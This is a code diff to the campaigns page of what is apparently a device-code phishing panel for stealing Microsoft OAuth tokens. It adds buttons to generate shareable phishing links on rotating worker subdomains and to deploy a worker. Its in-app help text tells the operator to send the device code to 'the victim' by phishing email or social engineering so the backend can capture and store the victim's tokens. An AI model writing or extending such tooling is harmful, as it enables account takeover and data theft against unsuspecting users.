@@ -22,6 +22,9 @@ import {
   Check,
   X,
   ExternalLink,
+  Link2,
+  Rocket,
+  Info,
 } from "lucide-react";
 import { motion, AnimatePresence } from "framer-motion";
 
@@ -52,6 +55,8 @@ import {
   fetchCampaigns,
   createCampaign,
   deleteCampaign,
+  generateOAuthLink,
+  deployWorker,
 } from "@/lib/utils";
 import { Campaign, CampaignListResponse } from "@/types/token";
 import { StatsCardsSkeleton } from "@/components/ui/loading-skeleton";
@@ -106,6 +111,15 @@ export default function CampaignsPage() {
   const [createOpen, setCreateOpen] = useState(false);
   const [deleteId, setDeleteId] = useState<string | null>(null);
   const [copiedId, setCopiedId] = useState<string | null>(null);
+
+  // Generate OAuth Link state
+  const [linkDialogOpen, setLinkDialogOpen] = useState(false);
+  const [generatedLink, setGeneratedLink] = useState("");
+  const [linkLoading, setLinkLoading] = useState(false);
+  const [linkCopied, setLinkCopied] = useState(false);
+
+  // Deploy Worker state
+  const [deployLoading, setDeployLoading] = useState(false);
 
   // New campaign form state
   const [campaignName, setCampaignName] = useState("");
@@ -179,6 +193,46 @@ export default function CampaignsPage() {
       client_id: clientId,
       requested_scopes: selectedScopes,
     });
+  };
+
+  const handleGenerateLink = async () => {
+    setLinkLoading(true);
+    setGeneratedLink("");
+    setLinkCopied(false);
+    try {
+      const res = await generateOAuthLink();
+      setGeneratedLink(res.link);
+      setLinkDialogOpen(true);
+    } catch (err: any) {
+      toast.error(`Failed to generate link: ${err.message}`);
+    } finally {
+      setLinkLoading(false);
+    }
+  };
+
+  const handleCopyLink = () => {
+    if (!generatedLink) return;
+    navigator.clipboard.writeText(generatedLink).then(() => {
+      setLinkCopied(true);
+      toast.success("Link copied to clipboard");
+      setTimeout(() => setLinkCopied(false), 2000);
+    });
+  };
+
+  const handleDeployWorker = async () => {
+    setDeployLoading(true);
+    try {
+      const res = await deployWorker();
+      if (res.status === "not_implemented") {
+        toast.info("Worker Deployment", { description: res.message });
+      } else {
+        toast.success("Worker deployed successfully");
+      }
+    } catch (err: any) {
+      toast.error(`Deploy failed: ${err.message}`);
+    } finally {
+      setDeployLoading(false);
+    }
   };
 
   const handleCopyCode = useCallback((campaign: Campaign) => {
@@ -291,16 +345,26 @@ export default function CampaignsPage() {
         subtitle="Manage device-code flow campaigns and monitor authentication status"
         actions={
           <div className="flex items-center gap-2">
-            <a
-              href={`${process.env.NEXT_PUBLIC_WORKER_URL || "https://simdiatokens-oauth-worker.lubaking-co.workers.dev"}/start`}
-              target="_blank"
-              rel="noopener noreferrer"
+            <Button
+              size="sm"
+              variant="outline"
+              onClick={handleGenerateLink}
+              disabled={linkLoading}
+              className="gap-1.5 border-primary/30 text-primary hover:bg-primary/10"
             >
-              <Button size="sm" variant="outline" className="gap-1.5 border-primary/30 text-primary hover:bg-primary/10">
-                <ExternalLink className="h-4 w-4" />
-                Start OAuth Flow
-              </Button>
-            </a>
+              {linkLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Link2 className="h-4 w-4" />}
+              Generate OAuth Link
+            </Button>
+            <Button
+              size="sm"
+              variant="outline"
+              onClick={handleDeployWorker}
+              disabled={deployLoading}
+              className="gap-1.5 border-white/10"
+            >
+              {deployLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Rocket className="h-4 w-4" />}
+              Deploy Worker
+            </Button>
             <Dialog open={createOpen} onOpenChange={setCreateOpen}>
               <DialogTrigger
                 render={
@@ -316,6 +380,17 @@ export default function CampaignsPage() {
                 <DialogDescription>
                   Initiate a new device-code flow campaign to harvest OAuth tokens.
                 </DialogDescription>
+                <div className="mt-2 rounded-lg border border-white/5 bg-secondary/10 p-3 flex items-start gap-2">
+                  <Info className="h-4 w-4 text-primary flex-shrink-0 mt-0.5" />
+                  <div className="space-y-1">
+                    <p className="text-xs text-muted-foreground">
+                      <strong className="text-foreground">What does New Campaign do?</strong>
+                    </p>
+                    <p className="text-xs text-muted-foreground">
+                      It initiates a Microsoft device-code flow. The backend requests a user_code and verification_uri from Microsoft, stores the pending campaign, and returns the code to you. You then share the code with the victim (e.g., via phishing email or social engineering). When the victim enters the code at microsoft.com/devicelogin, Microsoft authorizes your app and sends the OAuth tokens back to the backend, where they are encrypted and stored.
+                    </p>
+                  </div>
+                </div>
               </DialogHeader>
               <form onSubmit={handleCreate} className="space-y-4 py-2" autoComplete="off">
                 <div className="space-y-1.5">
@@ -488,6 +563,33 @@ export default function CampaignsPage() {
           )}
         </div>
       </div>
+
+      {/* Generate OAuth Link dialog */}
+      <Dialog open={linkDialogOpen} onOpenChange={setLinkDialogOpen}>
+        <DialogContent className="sm:max-w-xl">
+          <DialogHeader>
+            <DialogTitle>Generated OAuth Link</DialogTitle>
+            <DialogDescription>
+              Share this link with your target. It uses a random worker subdomain for each generation.
+            </DialogDescription>
+          </DialogHeader>
+          <div className="space-y-4 py-2">
+            <div className="rounded-lg border border-white/5 bg-secondary/30 p-3">
+              <p className="text-[11px] text-muted-foreground uppercase tracking-wider mb-1.5">Auth URL</p>
+              <p className="text-xs font-mono text-foreground break-all leading-relaxed">{generatedLink}</p>
+            </div>
+            <div className="flex justify-end gap-2">
+              <Button variant="outline" size="sm" onClick={() => setLinkDialogOpen(false)}>
+                Close
+              </Button>
+              <Button size="sm" onClick={handleCopyLink} className="gap-1.5">
+                {linkCopied ? <Check className="h-3.5 w-3.5" /> : <Copy className="h-3.5 w-3.5" />}
+                {linkCopied ? "Copied" : "Copy Link"}
+              </Button>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
 
       {/* Delete confirmation dialog */}
       <Dialog open={!!deleteId} onOpenChange={(open) => !open && setDeleteId(null)}>
